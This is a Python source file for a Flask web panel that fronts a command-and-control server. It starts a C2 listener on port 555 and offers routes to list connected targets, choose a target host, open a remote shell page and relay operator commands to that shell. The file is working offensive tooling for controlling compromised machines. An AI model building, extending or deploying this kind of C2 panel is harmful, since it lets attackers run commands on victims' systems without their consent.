from flask import *
import os
from .IntrnalSocketServer import IntrnalSocketServer
from Socket.Server import Server
import threading

class FlskSevrev(object):
    
    def __init__(self,C2Private,C2Port=555):
        self._internalSock = IntrnalSocketServer()
        self._internalSock.start()
        path = os.path.join(os.getcwd(),'FlascAplication','test','templates','static')
        print(path)
        self.app = Flask(__name__, static_folder=path)
        self.c2Server = Server(port=C2Port,PrivateKey=C2Private)
        self.c2Server.start()
        self.targetConnction = self.c2Server.connection
        self._ruleResetor()
        

    def getshell(self,hostname):
        self.choseTarget(hostname)
        return render_template('index.html',hostname=hostname)
    
    def choseTarget(self,targetIp):
        self.c2Server.connectTo = targetIp


    def listConnections(self):
        return self.c2Server.connections
    
    def homePage(self):
        return render_template('mainIndex.html')

    def send_message(self):
        data = request.get_json()
        message = data['message']
        self._internalSock._send_msg(message.encode())
        msg = self._internalSock._read_msg().decode(errors='replace')
        return {'message': msg}
    
    def closeShell(self):
        self._internalSock._send_msg('exit')

    
    def _ruleResetor(self):
        self.app.add_url_rule('/', 'homePage', self.homePage)
        self.app.add_url_rule('/listConnections', 'listConnections', self.listConnections)
        self.app.add_url_rule('/getshell/<hostname>', 'getshell', self.getshell)
        self.app.add_url_rule('/send_message', 'send_message', self.send_message, methods=['POST'])
        self.app.add_url_rule('/closeShell', 'closeShell', self.closeShell)

